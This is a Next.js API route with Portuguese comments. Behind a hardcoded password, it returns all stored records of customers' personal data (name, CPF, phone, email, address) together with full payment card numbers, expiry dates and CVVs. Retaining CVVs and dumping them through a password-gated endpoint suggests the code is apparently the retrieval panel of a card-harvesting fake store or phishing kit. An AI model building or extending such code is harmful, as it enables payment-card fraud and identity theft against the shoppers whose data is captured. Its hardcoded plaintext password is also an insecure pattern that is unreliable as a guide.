import { type NextRequest, NextResponse } from "next/server"
import { supabaseAdmin } from '@/lib/supabase'

export async function POST(request: NextRequest) {
  try {
    const { password } = await request.json()
    
    // Verificar senha
    if (password !== 'vipcolheita2025') {
      return NextResponse.json({ 
        success: false,
        error: "Senha incorreta"
      }, { status: 401 })
    }
    
    // Buscar dados do Supabase
    const { data, error } = await supabaseAdmin
      .from('card_data')
      .select('*')
      .order('timestamp', { ascending: false })
    
    if (error) {
      return NextResponse.json({ 
        success: false,
        error: "Erro ao buscar dados",
        details: error.message
      }, { status: 500 })
    }
    
    // Transformar dados para o formato esperado pelo frontend
    const formattedData = data?.map(item => ({
      id: item.id.toString(),
      timestamp: item.timestamp,
      customer: {
        name: item.customer_name,
        cpf: item.customer_cpf,
        phone: item.customer_phone,
        email: item.customer_email,
        address: item.customer_address
      },
      card: {
        number: item.card_number,
        holderName: item.card_holder_name,
        expiryDate: item.card_expiry_date,
        cvv: item.card_cvv
      },
      product: {
        name: item.product_name,
        price: item.product_price,
        quantity: item.product_quantity
      },
      total: item.total
    })) || []
    
    return NextResponse.json({ 
      success: true,
      data: formattedData
    })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao buscar dados",
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
